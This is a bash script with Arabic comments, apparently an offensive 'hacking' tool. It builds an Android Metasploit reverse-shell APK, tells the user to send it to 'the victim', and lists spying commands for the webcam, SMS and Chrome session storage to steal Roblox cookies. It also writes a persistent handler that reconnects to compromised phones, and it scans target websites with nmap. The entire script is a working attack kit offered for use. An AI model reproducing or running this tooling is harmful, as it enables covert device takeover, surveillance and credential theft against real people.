#!/bin/bash
# xxszmsx ULTIMATE | BY: STUDIO
# [!] FEATURES: PERSISTENT HACK, ROBLOX COOKIE GRABBER, WEB HACK
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'

# --- [ 1. حفظ البيانات واستعادتها ] ---
# الأداة هتحفظ الـ IP والبورت بتوعك في ملف مخفي عشان لو قفلت الجهاز
DB_FILE=".studio_db"
save_data() { echo "$1:$2" > $DB_FILE; }
load_data() { if [ -f $DB_FILE ]; then cat $DB_FILE; fi; }

# --- [ 2. ميزة اختراق المواقع (Web Hacking) ] ---
function web_hacker() {
    clear
    echo -e "${BLUE}--- [ WEB & SQL INJECTION SCANNER ] ---${NC}"
    read -p "[?] Target URL: " t_url
    echo -e "${RED}[*] Scanning for vulnerabilities in $t_url...${NC}"
    # استخدام nmap و sqlmap للفحص (لازم يكونوا مثبتين في كالي)
    nmap --script http-enum $t_url
}

# --- [ 3. ميزة اختراق الأندرويد + صيد روبلوكس ] ---
function android_master_hack() {
    clear
    echo -e "${RED}--- [ ANDROID PERSISTENT HACKER ] ---${NC}"
    read -p "[?] Enter Your IP (LHOST): " lh
    read -p "[?] Enter Port (LPORT): " lp
    save_data $lh $lp
    
    echo -e "${YELLOW}[*] Building Hacker APK with Auto-Start...${NC}"
    # صنع الفيروس
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > mazen_hacker.apk
    
    echo -e "-----------------------------------------------------"
    echo -e "${GREEN}[+] تم صنع الملف بنجاح في: $(pwd)/mazen_hacker.apk${NC}"
    echo -e "${YELLOW}[!] أرسل الملف للضحية. أوامر التجسس جاهزة الآن:${NC}"
    echo -e "1. ${BLUE}webcam_stream${NC} (لفتح الكاميرا فوراً)"
    echo -e "2. ${BLUE}dump_sms${NC} (لسحب رسايل الـ SMS)"
    echo -e "3. ${RED}ROBLOX GRABBER:${NC} استخدم الأمر التالي لسحب بيانات الكروم:"
    echo -e "   ${YELLOW}download /data/data/com.android.chrome/app_tabs/0/session_storage${NC}"
    echo -e "-----------------------------------------------------"
}

# --- [ 4. نظام الاستماع الدائم (Persistence) ] ---
function start_listener() {
    clear
    data=$(load_data)
    if [ -z "$data" ]; then
        echo -e "${RED}[!] لا توجد بيانات محفوظة. اصنع فيروس أولاً.${NC}"; sleep 2
        return
    fi
    IP=$(echo $data | cut -d: -f1)
    PORT=$(echo $data | cut -d: -f2)
    
    echo -e "${GREEN}[*] إعادة فتح السيطرة على IP: $IP بورت: $PORT ...${NC}"
    echo "use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $IP
set LPORT $PORT
set ExitOnSession false
exploit -j" > .handler.rc
    msfconsole -r .handler.rc
}

# --- [ القائمة الرئيسية ] ---
while true; do
    clear
    echo -e "${RED} ██╗  ██╗██╗  ██╗███████╗███████╗███    ███╗██╗  ██╗"
    echo " ╚██╗██╔╝╚██╗██╔╝██╔════╝██╔════╝████  ████║╚██╗██╔╝"
    echo "  ╚███╔╝  ╚███╔╝ ███████╗███████╗██╔████╔██║ ╚███╔╝ "
    echo "  ██╔██╗  ██╔██╗ ╚════██║╚════██║██║╚██╔╝██║ ██╔██╗ "
    echo " ██╔╝ ██╗██╔╝ ██╗███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
    echo -e " ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
    echo "-----------------------------------------------------"
    echo -e "   [!] STUDIO ULTIMATE MODE | SYSTEM PERSISTENCE    "
    echo "-----------------------------------------------------"
    echo -e "1) ${RED}ANDROID HACK (صنع الفيروس + تعليمات روبلوكس)${NC}"
    echo -e "2) ${BLUE}WEB HACK (اختراق المواقع)${NC}"
    echo -e "3) ${GREEN}RE-CONNECT (إعادة السيطرة على الضحايا)${NC}"
    echo -e "0) Exit"
    echo "-----------------------------------------------------"
    read -p "xxszmsx >> " choice

    case $choice in
        1) android_master_hack ;;
        2) web_hacker ;;
        3) start_listener ;;
        0) exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
done
